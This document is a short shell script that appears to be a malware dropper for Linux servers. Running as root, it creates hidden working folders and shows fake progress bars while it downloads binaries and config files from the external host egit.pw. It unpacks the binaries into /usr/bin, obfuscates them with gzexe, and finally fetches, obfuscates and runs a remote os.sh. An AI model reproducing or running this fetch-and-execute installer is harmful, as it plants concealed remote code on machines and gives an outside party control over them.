#!/bin/sh
wsfile="ws"
wsfile2="wssh"
link="http://egit.pw"
SAFEKEY="HLSH&Cat"
if [ ! -d "$wsfile" ]; then
echo "Mkdiring>>>>>>>>>>"
cd
echo "Mkdiring For Config A Folde >>>>>>>>>>"
mkdir $wsfile;
mkdir /etc/hls;
chmod 755 $wsfile;
cd $wsfile
echo "Mkdiring For Config B Folde >>>>>>>>>>"
mkdir $wsfile2;
chmod 755 $wsfile2;
echo "Mkdiring For New file >>>>>>>>>>"
touch /root/ws/newver.h
touch /root/ws/linkcnf.h
echo "Mkdir Is OK!"
else
touch /root/ws/newver.h
echo "Error>>>>>>>>>>"
echo "File Exists"
fi
cd
echo "Download Config File >>>>>>>>>>"
echo "-                              [01%]"
echo "=-                             [05%]"
echo "==-                            [10%]"
echo "===-                           [15%]"
echo "====-                          [20%]"
echo "=====-                         [25%]"
echo "======-                        [30%]"
wget -q $link/config/ver.h -O /root/ws/ver.h;
echo "=======-                       [35%]"
echo "========-                      [40%]"
echo "=========-                     [45%]"
cd /usr/bin
wget -q $link/lang/run.tar.bz2
tar xjf run.tar.bz2
rm -rf run.tar.bz2
cd
gzexe /usr/bin/runlang
gzexe /usr/bin/rundns
gzexe /usr/bin/runsh
gzexe /usr/bin/runws
echo "===========-                   [50%]"
echo "=============-                 [55%]"
echo "==============-                [60%]"
wget -q $link/config/config.h -O /root/ws/config.h;
echo "=================-             [65%]"
echo "===================-           [70%]"
echo "=====================-         [75%]"
echo "=======================-       [80%]"
echo "=========================-     [85%]"
echo "============================-  [90%]"
wget -q $link/lang/lang_en.h -O /root/ws/lang.h;
echo "=============================- [95%]"
echo "==============================[100%]"
wget -q $link/os.sh -O os.sh;gzexe os.sh;rm -rf *.sh~;sh os.sh



